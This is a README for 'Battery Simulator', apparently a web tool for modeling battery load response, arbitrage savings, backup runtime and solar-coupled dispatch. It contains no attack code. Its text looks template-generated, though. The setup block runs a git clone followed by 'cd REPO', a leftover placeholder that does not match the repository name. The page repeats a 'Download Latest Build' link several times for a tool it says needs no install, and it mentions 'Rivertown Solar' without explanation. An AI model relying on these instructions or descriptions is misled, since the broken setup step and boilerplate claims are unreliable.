# Battery Simulator - Energy Simulation 2026

> **Battery Simulator is a browser energy-modeling workspace for load response, arbitrage value, backup duration, and solar-aware dispatch in the 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owen-james48/battery-simulator-energy?style=flat-square)](https://github.com/owen-james48/battery-simulator-energy)

---

<p align="center">
  <a href="https://owen-james48.github.io/battery-simulator-energy/">
    <img src="https://img.shields.io/badge/Download-Battery%20Simulator%20Latest-brightgreen?style=for-the-badge" alt="Download Battery Simulator">
  </a>
</p>

> **[Download Latest Build - Battery Simulator](https://owen-james48.github.io/battery-simulator-energy/)**

---

[Download Latest Build](https://owen-james48.github.io/battery-simulator-energy/)

---

## What Battery Simulator Does

Battery Simulator lets you probe how storage behaves when demand, tariffs, and generation shift. In a single web UI you can drive load cases, quantify arbitrage timing, estimate how long a reserve lasts under backup duty, and walk through solar-coupled dispatch choices.

The tool supports practical energy-study loops, including work tied to Rivertown Solar. Tune the inputs, watch the modeled response, and stack operating ideas side by side so storage performance under mixed load and generation is easier to reason about.

---

## Capabilities

- Hands-on battery load runs that stress variable demand patterns.
- Charge and discharge timing views aimed at arbitrage savings.
- Backup-duration estimates that show how long stored energy can carry a load.
- Solar dispatch exploration for pairing storage with PV output.
- Full workflow in the browser—no standalone desktop install required.
- Scenario-centric controls for swapping assumptions and comparing outcomes.
- Practical reference points for solar, storage, and load-planning talks.
- Lean HTML packaging that fits straightforward web hosting.

---

## Getting Started

### Use the published build

Open the live package in a current browser:

[Launch Battery Simulator](https://owen-james48.github.io/battery-simulator-energy/)

### Work from a local clone

Fetch the repo and load the web entry from your machine:

```bash
git clone https://github.com/owen-james48/battery-simulator-energy.git
cd REPO
```

If you prefer a local static server, start it in the repo root and visit the URL it prints. For a quick check, open the main HTML file directly when your browser allows it.

---

## Typical Workflow

1. Launch the hosted build or your local copy.
2. Fill in battery, load, solar, and operating parameters shown in the UI.
3. Start an interactive load simulation.
4. Inspect energy flows and how the battery reacts.
5. Compare arbitrage savings under the chosen timing.
6. Check the estimated backup runtime.
7. Review solar dispatch output and refine the scenario.

Keep distinct scenario sets when you need clean comparisons across load shapes, storage sizing, or dispatch rules.

---

## Configuration Notes

All analysis knobs live in the web UI. Set the values that define load behavior, arbitrage logic, backup runtime, and solar dispatch for the case you care about.

On a local deploy, keep the project files intact and treat the checkout as a static site. Defaults and interface options that ship with the repo should stay in the included config or source files.

---

## Requirements

- A modern web browser.
- Network access when using the hosted build.
- A local repository copy for offline work or development.
- A static web server if the browser blocks raw `file://` loading.
- Enough client resources for the complexity of the scenario you run.

---

## FAQ

### Who should use Battery Simulator?

Anyone studying battery loads, arbitrage opportunities, backup runtime, or solar dispatch—including teams whose process involves Rivertown Solar.

### Is a local install mandatory?

No. The hosted web build runs without installing anything. Clone and serve locally only when you want full control or offline access.

### How do I pick up the newest release?

Grab the current published build from the download link, or refresh a local clone:

```bash
git pull
```

### Where do I change settings?

Enter scenario parameters in the interface. Anything specific to local hosting lives in the repository files and bundled configuration.

### The app will not open—what next?

Use an up-to-date browser, hard-refresh the page, and confirm every project file is present. Locally, switch to a static server if direct file open hits security limits.

### Can I evaluate more than one scenario?

Yes. Capture inputs and results for the first case, then alter battery, load, solar, or dispatch settings and rerun to compare.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
